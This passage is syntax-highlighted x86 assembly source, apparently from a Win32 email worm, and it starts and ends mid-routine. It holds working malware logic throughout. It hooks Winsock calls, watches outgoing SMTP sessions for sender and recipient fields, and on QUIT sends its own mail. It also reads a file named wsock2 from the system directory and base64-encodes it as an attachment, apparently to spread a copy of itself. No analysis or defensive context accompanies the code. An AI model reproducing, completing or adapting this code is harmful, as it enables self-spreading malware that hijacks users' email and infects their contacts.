    </span><span class="sc5">SaveMimeFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimefromsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MimeError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimefrom_address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tostatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckMimeTo</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckQuit</span><span class="sc0">

    </span><span class="sc5">SearchMimeToEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">ToEndLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">toendtag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SaveMimeTo</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ToEndLoop</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">SaveMimeTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimetosize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MimeError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimeto_address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tostatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckMimeFrom</span><span class="sc0">       
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckQuit</span><span class="sc0">

    </span><span class="sc5">MimeError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">

    </span><span class="sc5">CheckQuit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TIUQ'</span><span class="sc0">       
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SEND_MAIL</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InterceptionFinished</span><span class="sc0">

    </span><span class="sc5">ErrorWhileSending</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    
    </span><span class="sc5">InterceptionFinished</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tostatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">InterceptWsockApiCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ep va</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnewapiaddress</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; - ep RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">woldapiaddress</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; = imagebase</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">INTERCEPT_WSOCK</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;========================[ ic-ws_attachment.inc ]===========================;</span><span class="sc0">

</span><span class="sc5">PREPARE_ATTACHMENT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">SetSysDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_SYSDIR</span><span class="sc0">

    </span><span class="sc5">OpenSourceFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; save file handle</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoBase64Encode</span><span class="sc0">
  
    </span><span class="sc5">GetSourceFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoBase64Encode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; get file size</span><span class="sc0">
    
    </span><span class="sc5">AllocateSourceMemory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoBase64Encode</span><span class="sc0">                   </span><span class="sc1">; not enough memory?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">smHnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; sourcememory handle</span><span class="sc0">

    </span><span class="sc5">AllocateDestinationMemory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoBase64Encode</span><span class="sc0">                   </span><span class="sc1">; not enough memory?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; destinationmemory handle</span><span class="sc0">

    </span><span class="sc5">ReadSourceFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bytesread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bytesread</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">smHnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AReadFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bytesread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoBase64Encode</span><span class="sc0">               </span><span class="sc1">; nothing read ?</span><span class="sc0">

    </span><span class="sc5">CloseSourceFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; close the file</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">EncodeSourceData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">smHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64_ENCODER</span><span class="sc0">                     </span><span class="sc1">; encode into Base64</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encodedsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">NoBase64Encode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">PREPARE_ATTACHMENT</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=========================[ ic-ws_b64encoder.inc ]==========================;</span><span class="sc0">

</span><span class="sc5">BASE64_ENCODER</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; in:   eax address of data to encode</span><span class="sc0">
    </span><span class="sc1">;       edx address to put encoded data</span><span class="sc0">
    </span><span class="sc1">;       ecx size of data to encode</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc1">; out:  ecx size of encoded data</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc5">CheckFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
